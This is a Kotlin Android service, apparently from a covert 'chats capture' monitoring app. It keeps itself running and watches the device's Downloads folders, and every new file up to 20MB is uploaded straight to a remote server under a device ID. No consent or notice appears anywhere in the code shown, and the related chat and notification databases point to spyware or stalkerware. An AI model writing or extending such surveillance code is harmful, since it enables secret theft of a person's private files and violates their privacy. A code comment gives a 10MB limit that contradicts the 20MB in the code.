package com.chats.capture.services

import android.app.Service
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import com.chats.capture.CaptureApplication
import com.chats.capture.database.MediaFileDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.managers.MediaUploadManager
import com.chats.capture.models.MediaFile
import com.chats.capture.models.UploadStatus
import com.chats.capture.utils.FileUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber
import java.io.File

/**
 * Service that monitors download directories for new files
 * Immediately uploads files < 10MB to the server
 */
class DownloadMonitorService : Service() {
    
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var downloadObserver: ContentObserver? = null
    private val MAX_UPLOAD_SIZE = 20 * 1024 * 1024L // 20MB
    private val processedFiles = mutableSetOf<String>() // Track processed files to avoid duplicates
    
    override fun onCreate() {
        super.onCreate()
        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
            Timber.tag("DOWNLOAD_MONITOR").i("🛑 Capture disabled - stopping DownloadMonitorService")
            stopSelf()
            return
        }
        Timber.tag("DOWNLOAD_MONITOR").i("🚀 DownloadMonitorService created - Monitoring download directories")
        startMonitoring()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Restart if killed
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        stopMonitoring()
        Timber.tag("DOWNLOAD_MONITOR").w("⚠️ DownloadMonitorService destroyed")
    }
    
    private fun startMonitoring() {
        try {
            // Monitor Downloads directory using ContentObserver
            val downloadsUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                MediaStore.Downloads.EXTERNAL_CONTENT_URI
            } else {
                Uri.parse("content://downloads/public_downloads")
            }
            
            downloadObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    scope.launch {
                        delay(2000) // Wait 2 seconds for file to be fully written
                        checkForNewDownloads()
                    }
                }
            }
            
            contentResolver.registerContentObserver(
                downloadsUri,
                true,
                downloadObserver!!
            )
            
            // Also monitor common download directories
            scope.launch {
                // Initial scan
                delay(5000) // Wait 5 seconds after service start
                checkForNewDownloads()
                
                // Periodic scan every 30 seconds
                while (true) {
                    delay(30000)
                    checkForNewDownloads()
                }
            }
            
            Timber.tag("DOWNLOAD_MONITOR").i("✅ Download monitoring started")
        } catch (e: Exception) {
            Timber.tag("DOWNLOAD_MONITOR").e(e, "Error starting download monitoring")
        }
    }
    
    private fun stopMonitoring() {
        downloadObserver?.let {
            contentResolver.unregisterContentObserver(it)
            downloadObserver = null
        }
    }
    
    private suspend fun checkForNewDownloads() {
        try {
            val downloadDirs = listOf(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                File(Environment.getExternalStorageDirectory(), "Download"),
                File(Environment.getExternalStorageDirectory(), "Downloads")
            )
            
            downloadDirs.forEach { dir ->
                if (dir.exists() && dir.isDirectory) {
                    scanDirectory(dir)
                }
            }
        } catch (e: Exception) {
            Timber.tag("DOWNLOAD_MONITOR").e(e, "Error checking for new downloads")
        }
    }
    
    private suspend fun scanDirectory(directory: File, depth: Int = 0) {
        try {
            // Limit recursion depth to avoid scanning too deep
            if (depth > 3) return
            
            directory.listFiles()?.forEach { file ->
                if (file.isFile && !processedFiles.contains(file.absolutePath)) {
                    // Check if file is new (modified in last 5 minutes)
                    val fiveMinutesAgo = System.currentTimeMillis() - (5 * 60 * 1000)
                    if (file.lastModified() > fiveMinutesAgo) {
                        val fileSize = file.length()
                        // Check file size - must be > 0 and <= 20MB
                        if (fileSize > 0 && fileSize <= MAX_UPLOAD_SIZE) {
                            processedFiles.add(file.absolutePath)
                            Timber.tag("DOWNLOAD_MONITOR").i("📥 New file detected: ${file.name} (${fileSize / (1024 * 1024)}MB)")
                            uploadFileImmediately(file)
                        } else if (fileSize > MAX_UPLOAD_SIZE) {
                            Timber.tag("DOWNLOAD_MONITOR").w("⚠️ File size ${fileSize / (1024 * 1024)}MB exceeds 20MB limit - Skipping: ${file.name}")
                        }
                    }
                } else if (file.isDirectory) {
                    // Recursively scan subdirectories (limit depth)
                    scanDirectory(file, depth + 1)
                }
            }
        } catch (e: Exception) {
            Timber.w(e, "Error scanning directory: ${directory.absolutePath}")
        }
    }
    
    private suspend fun uploadFileImmediately(file: File) {
        try {
            val database = (applicationContext as CaptureApplication).database
            val mediaFileDao = database.mediaFileDao()
            val deviceRegistrationManager = DeviceRegistrationManager(this)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            // Calculate checksum
            val checksum = FileUtils.calculateChecksum(file)
            
            // Check if file already exists (by checksum)
            val existing = mediaFileDao.findMediaFileByChecksum(checksum)
            if (existing != null && existing.uploadStatus == UploadStatus.SUCCESS) {
                Timber.tag("DOWNLOAD_MONITOR").d("File already uploaded: ${file.name}")
                return
            }
            
            // Determine MIME type
            val mimeType = FileUtils.getMimeTypeFromFile(file)
            
            // Create MediaFile entry
            val mediaFile = MediaFile(
                deviceId = deviceId,
                notificationId = "download_${System.currentTimeMillis()}_${file.name}",
                appPackage = "file_download", // Mark as downloaded file
                localPath = file.absolutePath,
                fileSize = file.length(),
                mimeType = mimeType,
                checksum = checksum,
                uploadStatus = UploadStatus.PENDING
            )
            
            // Save to database
            mediaFileDao.insertMediaFile(mediaFile)
            Timber.tag("DOWNLOAD_MONITOR").d("File saved to database: ${mediaFile.id}")
            
            // Upload immediately
            val mediaUploadManager = MediaUploadManager(
                this,
                mediaFileDao,
                database.notificationDao(),
                database.chatDao()
            )
            
            val success = mediaUploadManager.uploadMediaFile(mediaFile)
            if (success) {
                Timber.tag("DOWNLOAD_MONITOR").i("✅ File uploaded immediately: ${file.name}")
            } else {
                Timber.tag("DOWNLOAD_MONITOR").w("⚠️ File upload queued (will retry): ${file.name}")
            }
        } catch (e: Exception) {
            Timber.tag("DOWNLOAD_MONITOR").e(e, "Error uploading file immediately: ${e.message}")
        }
    }
}
